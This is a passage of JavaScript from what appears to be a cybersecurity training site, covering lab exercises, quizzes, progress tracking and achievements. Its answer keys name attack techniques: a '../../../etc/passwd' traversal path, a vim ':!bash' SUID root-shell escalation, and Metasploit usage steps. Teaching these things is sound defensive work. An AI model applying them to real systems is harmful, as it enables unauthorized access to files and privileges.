        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Directory Traversal Challenge</span></div><div class="lab-body"><p>A web app serves files from <code>/var/www/uploads/</code>. Craft a path to read <code>/etc/passwd</code>:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><span style="font-family:var(--font-mono);font-size:0.85rem">/var/www/uploads/</span><input id="labDTIn" style="width:200px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)" placeholder="??"><button class="demo-btn" id="labDTCheck">Check</button></div><div id="labDTFeedback" style="text-align:center"></div></div></div>';
        $('#labDTCheck').onclick = function() {
            var ans = $('#labDTIn').value.trim();
            if (ans.indexOf('..') >= 0 && ans.indexOf('etc/passwd') >= 0) $('#labDTFeedback').innerHTML = '<span style="color:var(--success)">Correct! ../../../etc/passwd traverses up from uploads to read system files.</span>';
            else $('#labDTFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Use ../ to go up directories until you reach the root.</span>';
        };
    }

    function labUpload(pane) {
        labGeneric(pane, 'File Upload Security',
            'Which is the MOST effective defense against malicious file uploads?',
            ['Check file extension only', 'Check MIME type only', 'Validate magic bytes, use allowlist, rename files, store outside webroot', 'Limit file size to 1 MB'], 2);
    }

    function labBOF2(pane) {
        labGeneric(pane, 'Buffer Overflow',
            'In a buffer overflow attack, what is the attacker trying to overwrite?',
            ['The hard drive', 'The return address (EIP) to redirect execution', 'The network buffer', 'The CPU cache'], 1);
    }

    function labIntOverflow(pane) {
        labGeneric(pane, 'Integer Overflow',
            'What happens when you add 1 to an unsigned 8-bit integer storing 255?',
            ['It becomes 256', 'It wraps to 0 (overflow)', 'It stays at 255', 'It crashes the program'], 1);
    }

    function labMSF(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Metasploit Challenge</span></div><div class="lab-body"><p>Put these Metasploit steps in the correct order:</p><div style="display:flex;flex-direction:column;gap:8px;margin:16px 0" id="msfSteps"></div><div id="labMSFFeedback" style="text-align:center;margin-top:8px"></div></div></div>';
        var steps = ['search (find exploit)', 'use (select module)', 'set RHOSTS (target)', 'exploit (launch)'];
        var shuffled = steps.slice().sort(function(){return Math.random()-0.5;});
        var selected = [];
        var cont = $('#msfSteps');
        function renderMSF() {
            cont.innerHTML = '';
            shuffled.forEach(function(s) {
                if (selected.indexOf(s) < 0) cont.innerHTML += '<button class="demo-btn demo-btn-sm msfStep" style="text-align:left">'+s+'</button>';
            });
            if (selected.length) cont.innerHTML += '<div style="margin-top:8px;font-family:var(--font-mono);font-size:0.85rem">Order: ' + selected.join(' -> ') + '</div>';
            if (selected.length === 4) {
                var correct = selected.every(function(s,i){return s===steps[i];});
                $('#labMSFFeedback').innerHTML = correct ? '<span style="color:var(--success)">Correct order!</span>' : '<span style="color:var(--danger)">Wrong order. Click to try again.</span>';
                if (!correct) { selected = []; setTimeout(renderMSF, 1500); }
            }
            $$('.msfStep').forEach(function(b) { b.onclick = function() { selected.push(b.textContent); renderMSF(); }; });
        }
        renderMSF();
    }

    function labPhishing2(pane) {
        labGeneric(pane, 'Phishing Detection',
            'Which email address is MOST likely a phishing attempt?',
            ['support@microsoft.com', 'noreply@amaz0n-verify.com', 'admin@company.org', 'help@google.com'], 1);
    }

    function labPrivEsc2(pane) {
        labGeneric(pane, 'Privilege Escalation',
            'After getting a low-privilege shell, what is the FIRST thing to check for privilege escalation on Linux?',
            ['Check if Chrome is installed', 'Run sudo -l and find SUID binaries', 'Restart the server', 'Install a GUI'], 1);
    }

    function labSUID2(pane) {
        labGeneric(pane, 'SUID Exploitation',
            'If /usr/bin/vim has the SUID bit set and runs as root, how can you escalate?',
            ['Delete vim', 'Run vim then :!bash to get a root shell', 'Read vim documentation', 'vim cannot be exploited'], 1);
    }

    function labWinPrivEsc2(pane) {
        labGeneric(pane, 'Windows Priv Esc',
            'What is the "Unquoted Service Path" vulnerability?',
            ['A service runs with no quotes around its path, allowing an attacker to place a malicious executable in a directory that Windows tries first', 'A missing environment variable', 'A registry corruption', 'A DLL versioning issue'], 0);
    }


    /* Submit lab result */
    async function submitLabResult(lesson, success) {
        if (!state.user || !lesson) return;
        try {
            await api(`/progress/lab/${lesson.id}`, {
                method: 'POST',
                body: JSON.stringify({ completed: success }),
            });
            toast('Lab exercise completed! 🎉', 'success');
        } catch (_) {
            // Silently fail – don't disrupt user experience
        }
    }

    /* ============================================================
       QUIZ
       ============================================================ */
    async function renderQuizTab(lesson) {
        const pane = $('#pane-quiz');
        if (!lesson.id) { pane.innerHTML = '<div class="empty-state"><p>Quiz not available.</p></div>'; return; }
        pane.innerHTML = '<div class="loading-screen"><div class="spinner"></div><span>Loading quiz…</span></div>';

        const questions = await loadQuiz(lesson.id);
        if (!questions || !questions.length) { pane.innerHTML = '<div class="empty-state"><div class="icon">❓</div><p>No quiz questions available for this lesson.</p></div>'; return; }

        state.quizData = questions;
        state.quizIndex = 0;
        state.quizScore = 0;
        state.quizAnswered = false;
        state.quizAnswers = []; // Track answers for submission

        renderQuizQuestion(pane);
    }

    function renderQuizQuestion(pane) {
        const q = state.quizData[state.quizIndex];
        const total = state.quizData.length;
        const idx = state.quizIndex;

        if (!q) { renderQuizResults(pane); return; }

        const options = [];
        if (q.optionA) options.push({ key: 'A', text: q.optionA });
        if (q.optionB) options.push({ key: 'B', text: q.optionB });
        if (q.optionC) options.push({ key: 'C', text: q.optionC });
        if (q.optionD) options.push({ key: 'D', text: q.optionD });

        pane.innerHTML = `
            <div class="quiz-container">
                <div class="quiz-progress">
                    <div class="quiz-progress-bar"><div class="quiz-progress-fill" style="width:${((idx) / total) * 100}%"></div></div>
                    <span class="quiz-progress-text">${idx + 1} / ${total}</span>
                </div>
                <div class="question-card">
                    <h3>Q${idx + 1}. ${esc(q.questionText || q.question)}</h3>
                    <ul class="options-list">
                        ${options.map((o) => `<li class="option-item" data-key="${o.key}"><span class="option-letter">${o.key}</span><span>${esc(o.text)}</span></li>`).join('')}
                    </ul>
                    <div class="quiz-explanation" id="quizExplanation" style="display:none"></div>
                    <div class="quiz-actions">
                        <span></span>
                        <button class="btn btn-primary" id="quizNextBtn" style="display:none">Next →</button>
                    </div>
                </div>
            </div>`;

        state.quizAnswered = false;

        $$('.option-item').forEach((opt) => {
            opt.onclick = async () => {
                if (state.quizAnswered) return;
                state.quizAnswered = true;
                const selected = opt.dataset.key;

                // Disable all options immediately
                $$('.option-item').forEach((o) => o.style.pointerEvents = 'none');

                // Check answer via server API
                try {
                    const result = await api('/quiz/check', {
                        method: 'POST',
                        body: JSON.stringify({ questionId: q.id, selected: selected }),
                    });

                    const isCorrect = result.correct;
                    const correctKey = (result.correctAnswer || '').toUpperCase();
                    if (isCorrect) state.quizScore++;

                    // Track answer for final submission
                    state.quizAnswers.push({ questionId: q.id, selected: selected });

                    $$('.option-item').forEach((o) => {
                        if (o.dataset.key === correctKey) o.classList.add('correct');
                        else if (o.dataset.key === selected && !isCorrect) o.classList.add('wrong');
                    });

                    const exp = $('#quizExplanation');
                    exp.style.display = 'block';
                    exp.innerHTML = `<strong>${isCorrect ? '✅ Correct!' : '❌ Incorrect.'}</strong> ${esc(result.explanation || '')}`;

                } catch (err) {
                    // Fallback if server check fails
                    const exp = $('#quizExplanation');
                    exp.style.display = 'block';
                    exp.innerHTML = '<strong>⚠️ Could not verify answer.</strong> Please try again.';
                    state.quizAnswered = false;
                    $$('.option-item').forEach((o) => o.style.pointerEvents = '');
                    return;
                }

                $('#quizNextBtn').style.display = 'inline-flex';
            };
        });

        $('#quizNextBtn').onclick = () => {
            state.quizIndex++;
            renderQuizQuestion(pane);
        };
    }

    function renderQuizResults(pane) {
        const total = state.quizData.length;
        const score = state.quizScore;
        const pct = Math.round((score / total) * 100);
        const pass = pct >= 70;

        pane.innerHTML = `
            <div class="quiz-container">
                <div class="quiz-results">
                    <div class="result-icon">${pass ? '🎉' : '📝'}</div>
                    <h2>${pass ? 'Congratulations!' : 'Keep Learning!'}</h2>
                    <div class="score-display ${pass ? 'pass' : 'fail'}">${pct}%</div>
                    <p class="score-detail">${score} out of ${total} correct</p>
                    <p style="color:var(--text-muted);font-size:0.85rem;margin-bottom:24px">${pass ? 'You\'ve demonstrated a solid understanding of this topic!' : 'Review the theory and demos, then try again. You need 70% to pass.'}</p>
                    <div style="display:flex;gap:10px;justify-content:center">
                        <button class="btn btn-outline" id="quizRetryBtn">🔄 Retry</button>
                        <button class="btn btn-primary" id="quizFinishBtn">✓ Done</button>
                    </div>
                </div>
            </div>`;

        // Submit quiz score via proper endpoint
        if (state.user && state.currentLesson) {
            api(`/quiz/${state.currentLesson.id}/submit`, {
                method: 'POST',
                body: JSON.stringify({ answers: state.quizAnswers }),
            }).then(() => {
                loadProgress(); // Refresh progress after quiz submission
            }).catch(() => {});
        }

        $('#quizRetryBtn').onclick = () => { state.quizIndex = 0; state.quizScore = 0; state.quizAnswers = []; renderQuizQuestion(pane); };
        $('#quizFinishBtn').onclick = () => { $$('.lesson-tab')[0].click(); };
    }

    /* ============================================================
       SCORE / PROGRESS PAGE
       ============================================================ */
    async function renderScore() {
        const c = content();
        if (!state.user) { c.innerHTML = '<div class="empty-state"><div class="icon">🔒</div><p>Please sign in to view your progress.</p></div>'; return; }
        c.innerHTML = '<div class="loading-screen"><div class="spinner"></div></div>';
        await loadProgress();
        const lessons = await loadLessons();

        c.innerHTML = `
            <div class="section-header"><h2>Your Progress</h2></div>
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-icon green">✅</div><div class="stat-info"><div class="stat-value">${state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length}</div><div class="stat-label">Completed</div></div></div>
                <div class="stat-card"><div class="stat-icon yellow">🔄</div><div class="stat-info"><div class="stat-value">${state.progress.filter((p) => p.lessonStatus === 'in_progress').length}</div><div class="stat-label">In Progress</div></div></div>
                <div class="stat-card"><div class="stat-icon blue">📝</div><div class="stat-info"><div class="stat-value">${lessons.length}</div><div class="stat-label">Total Lessons</div></div></div>
                <div class="stat-card"><div class="stat-icon purple">🏆</div><div class="stat-info"><div class="stat-value">${lessons.length > 0 ? Math.round((state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length / lessons.length) * 100) : 0}%</div><div class="stat-label">Overall</div></div></div>
            </div>
            <div class="card card-flat">
                <h3 style="margin-bottom:12px;color:var(--text-dark)">Lesson Progress</h3>
                <div class="progress-list" id="progressList"></div>
            </div>`;

        const list = $('#progressList');
        lessons.forEach((ls) => {
            const prog = state.progress.find((p) => p.lessonId === ls.id);
            const done = prog && (prog.completed || prog.lessonStatus === 'completed');
            const inProg = prog && prog.lessonStatus === 'in_progress';
            const statusIcon = done ? '✅' : inProg ? '🔄' : '⬜';
            const div = el('div', 'progress-item');
            div.innerHTML = `
                <span style="font-size:1.1rem">${statusIcon}</span>
                <span class="lesson-name">${esc(ls.title)}</span>
                <div class="badges">
                    <span class="badge ${done ? 'badge-done' : inProg ? 'badge-progress' : 'badge-pending'}">${done ? 'Completed' : inProg ? 'In Progress' : 'Not Started'}</span>
                    ${prog && prog.quizScore !== undefined && prog.quizScore > 0 ? `<span class="badge badge-score">Quiz: ${prog.quizScore}%</span>` : ''}
                    ${prog && prog.demoCompleted ? '<span class="badge badge-done">Demo ✓</span>' : ''}
                    ${prog && prog.labCompleted ? '<span class="badge badge-done">Lab ✓</span>' : ''}
                </div>`;
            div.style.cursor = 'pointer';
            div.onclick = () => navigate(`/lesson/${ls.slug}`);
            list.appendChild(div);
        });
    }

    /* ============================================================
       ACHIEVEMENTS
       ============================================================ */
    function renderAchievements() {
        const c = content();
        if (!state.user) { c.innerHTML = '<div class="empty-state"><div class="icon">🔒</div><p>Please sign in to view achievements.</p></div>'; return; }

        const completed = state.progress.filter((p) => p.completed || p.lessonStatus === 'completed').length;
        const achievements = [
            { icon: '🌟', name: 'First Steps', desc: 'Complete your first lesson', unlocked: completed >= 1 },
            { icon: '🔐', name: 'Security Novice', desc: 'Complete 3 lessons', unlocked: completed >= 3 },
            { icon: '🛡️', name: 'Defender', desc: 'Complete 5 lessons', unlocked: completed >= 5 },
            { icon: '⚔️', name: 'Penetration Tester', desc: 'Complete all lessons', unlocked: completed >= 8 },
            { icon: '🏅', name: 'Quiz Master', desc: 'Score 100% on any quiz', unlocked: state.progress.some((p) => p.quizScore >= 100) },
            { icon: '🧪', name: 'Lab Rat', desc: 'Complete all lab exercises', unlocked: state.progress.filter((p) => p.labCompleted).length >= 8 },
        ];

        c.innerHTML = `
            <div class="section-header"><h2>🏆 Achievements</h2></div>
            <div class="courses-grid">${achievements.map((a) => `
                <div class="card" style="${!a.unlocked ? 'opacity:0.5;filter:grayscale(1)' : ''}">
                    <div style="font-size:2.5rem;margin-bottom:8px">${a.icon}</div>
                    <h3 style="font-size:1rem;font-weight:700;color:var(--text-dark);margin-bottom:4px">${a.name}</h3>
                    <p style="font-size:0.85rem;color:var(--text-muted)">${a.desc}</p>
                    <div style="margin-top:8px"><span class="meta-badge ${a.unlocked ? 'beginner' : 'info'}">${a.unlocked ? '✅ Unlocked' : '🔒 Locked'}</span></div>
                </div>`).join('')}
            </div>`;
    }

    /* ============================================================
       SIDEBAR NAV
       ============================================================ */
    function initSidebar() {
        $$('.nav-item[data-route]').forEach((item) => {
            item.addEventListener('click', () => navigate(item.dataset.route));
        });

        const toggle = $('#sidebarToggle');
        const sidebar = $('.sidebar');
        if (toggle && sidebar) {
            toggle.onclick = () => sidebar.classList.toggle('show');
            // close sidebar on mobile when navigating
            window.addEventListener('hashchange', () => sidebar.classList.remove('show'));
        }
    }

    /* ============================================================
       UTILITIES
       ============================================================ */
    function esc(s) {
        if (!s) return '';
        const d = document.createElement('div');
        d.textContent = s;
        return d.innerHTML;
    }

    /* ============================================================
       INIT
       ============================================================ */
    document.addEventListener('DOMContentLoaded', () => {
        initAuth();
        initSidebar();
        checkSession();
        window.addEventListener('hashchange', router);
        router();
    });
})();
